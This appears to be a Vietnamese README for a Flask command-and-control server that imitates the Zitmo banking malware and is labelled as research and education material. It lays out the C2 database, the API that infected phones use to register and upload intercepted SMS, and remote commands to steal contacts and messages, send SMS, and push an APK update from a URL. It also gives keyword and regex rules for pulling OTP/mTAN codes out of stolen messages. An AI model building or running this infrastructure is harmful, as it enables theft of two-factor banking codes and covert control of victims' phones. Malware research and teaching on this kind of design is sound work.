# Zitmo C&C Server

Máy chủ Command & Control (C&C) cho hệ thống mô phỏng Zitmo malware, phục vụ mục đích nghiên cứu và giáo dục.

## Tổng quan

Server này mô phỏng cách hoạt động của máy chủ điều khiển Zitmo trong việc:
- Quản lý thiết bị bị nhiễm
- Thu thập SMS bị chặn (đặc biệt là mã OTP/mTAN)
- Gửi lệnh điều khiển từ xa
- Theo dõi hoạt động của thiết bị

## Tính năng chính

### 1. Giao diện quản trị web
- Dashboard trực quan với 4 tab chính
- Tự động làm mới dữ liệu mỗi 30 giây
- Phát hiện thiết bị online/offline
- Highlight SMS chứa mã xác thực

### 2. Quản lý thiết bị
- Đăng ký và theo dõi thiết bị
- Hiển thị thông tin chi tiết
- Trạng thái hoạt động real-time

### 3. Thu thập SMS
- Lưu trữ SMS bị chặn
- Phát hiện tự động mã OTP/mTAN
- Lọc SMS theo thiết bị

### 4. Điều khiển từ xa
- Gửi 5 loại lệnh cơ bản
- Theo dõi lệnh đang chờ
- Lịch sử thực thi lệnh

## Cài đặt và khởi động

### Yêu cầu hệ thống
- Python 3.6+
- Flask framework
- SQLite3

### Cài đặt dependencies
```bash
pip install flask
```

### Khởi động server
```bash
python zitmo_c2_server.py
```

Server sẽ chạy tại: http://localhost:5000

## Cấu trúc database

Server sử dụng SQLite với 3 bảng chính:

### 1. Bảng `devices`
```sql
CREATE TABLE devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE,
    device_info TEXT,
    phone_number TEXT,
    operator TEXT,
    first_seen TIMESTAMP,
    last_seen TIMESTAMP
)
```

### 2. Bảng `intercepted_sms`
```sql
CREATE TABLE intercepted_sms (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    sender TEXT,
    message TEXT,
    timestamp TIMESTAMP,
    processed INTEGER DEFAULT 0,
    FOREIGN KEY (device_id) REFERENCES devices (device_id)
)
```

### 3. Bảng `commands`
```sql
CREATE TABLE commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    command_type TEXT,
    command_data TEXT,
    timestamp TIMESTAMP,
    executed INTEGER DEFAULT 0,
    result TEXT,
    FOREIGN KEY (device_id) REFERENCES devices (device_id)
)
```

## API Endpoints

### 1. Client API

| Endpoint | Method | Mô tả | Request Body |
|----------|--------|-------|--------------|
| `/register` | POST | Đăng ký thiết bị | `{device_id, device_info, phone_number, operator}` |
| `/intercepted_sms` | POST | Gửi SMS bị chặn | `{device_id, sender, message, timestamp}` |
| `/ping` | POST | Ping và nhận lệnh | `{device_id}` |
| `/command_executed` | POST | Báo cáo thực thi lệnh | `{device_id, command_id, result}` |

### 2. Admin API

| Endpoint | Method | Mô tả | Query Parameters |
|----------|--------|-------|------------------|
| `/admin` | GET | Giao diện quản trị web | - |
| `/admin/devices` | GET | Lấy danh sách thiết bị | - |
| `/admin/intercepted_sms` | GET | Lấy SMS đã chặn | `device_id` (optional) |
| `/admin/pending_commands` | GET | Lệnh đang chờ | - |
| `/admin/command_history` | GET | Lịch sử lệnh | - |
| `/admin/add_command` | POST | Thêm lệnh mới | Body: `{device_id, command_type, command_data}` |

## Các loại lệnh hỗ trợ

| Loại lệnh | Mô tả | Dữ liệu mẫu |
|-----------|-------|-------------|
| `get_contacts` | Lấy danh bạ | `{}` |
| `get_sms` | Lấy tin nhắn | `{"limit": 50}` |
| `send_sms` | Gửi tin nhắn | `{"to": "+84123456789", "message": "Test"}` |
| `update` | Cập nhật ứng dụng | `{"url": "http://example.com/update.apk"}` |
| `uninstall` | Gỡ cài đặt | `{}` |

## Tính năng phát hiện mTAN

Server tự động phát hiện SMS có thể chứa mã xác thực dựa trên:

### Từ khóa
- Tiếng Việt: mã xác thực, mã otp, mã giao dịch, mã bảo mật, chuyển khoản
- Tiếng Anh: verification code, security code, authentication code, mtan, one-time password

### Mẫu số
- Chuỗi 4-8 chữ số liên tiếp (regex: `\b\d{4,8}\b`)

## File logs và dữ liệu

- **Database**: `zitmo_data.db` - Lưu trữ tất cả dữ liệu
- **Log file**: `zitmo_cnc.log` - Ghi lại hoạt động của server

## Giao diện quản trị

### Tab 1: Thiết bị
- Hiển thị danh sách thiết bị đã đăng ký
- Thông tin chi tiết: ID, model, số điện thoại, nhà mạng
- Trạng thái online/offline (dựa trên thời gian ping cuối)

### Tab 2: SMS đã chặn
- Danh sách SMS bị chặn từ các thiết bị
- Lọc theo thiết bị cụ thể
- Highlight SMS chứa mã xác thực

### Tab 3: Lệnh điều khiển
- Form gửi lệnh mới đến thiết bị
- Danh sách lệnh đang chờ thực thi
- Template JSON cho từng loại lệnh

### Tab 4: Lịch sử lệnh
- Lịch sử tất cả lệnh đã gửi
- Trạng thái thực thi
- Kết quả trả về từ thiết bị

## Bảo mật

⚠️ **CẢNH BÁO**: Server này chỉ dành cho mục đích nghiên cứu và giáo dục.

### Khuyến nghị bảo mật:
1. **KHÔNG** chạy server trên internet công cộng
2. Sử dụng firewall để giới hạn truy cập
3. Thêm xác thực cho các endpoint admin (production)
4. Sử dụng HTTPS thay vì HTTP
5. Mã hóa dữ liệu nhạy cảm

## Debug mode

Server hiện chạy ở chế độ debug (`debug=True`) để dễ dàng phát triển. Trong môi trường production, nên tắt debug:

```python
app.run(host='0.0.0.0', port=5000, debug=False)
```

## Tùy chỉnh

### Thay đổi cổng
Chỉnh sửa dòng cuối trong file:
```python
app.run(host='0.0.0.0', port=YOUR_PORT, debug=True)
```

### Thay đổi thời gian refresh
Chỉnh sửa trong phần JavaScript:
```javascript
setInterval(() => {
    // Auto-refresh code
}, 30000); // Đổi từ 30000ms sang giá trị khác
```

### Thêm loại lệnh mới
1. Thêm option trong HTML template
2. Thêm case trong `updateCommandData()` 
3. Xử lý trong client Android

## Troubleshooting

### Server không khởi động
- Kiểm tra Python đã cài Flask
- Kiểm tra cổng 5000 có bị chiếm không
- Kiểm tra quyền ghi file cho database

### Không thấy thiết bị online
- Thiết bị cần ping trong vòng 20 phút
- Kiểm tra kết nối mạng giữa client và server
- Xem log file để debug

### SMS không được ghi nhận
- Kiểm tra client có gửi đúng format JSON
- Xem log để kiểm tra lỗi database
- Đảm bảo device_id đã được đăng ký

## License

Mã nguồn này được phát hành dưới giấy phép MIT cho mục đích giáo dục.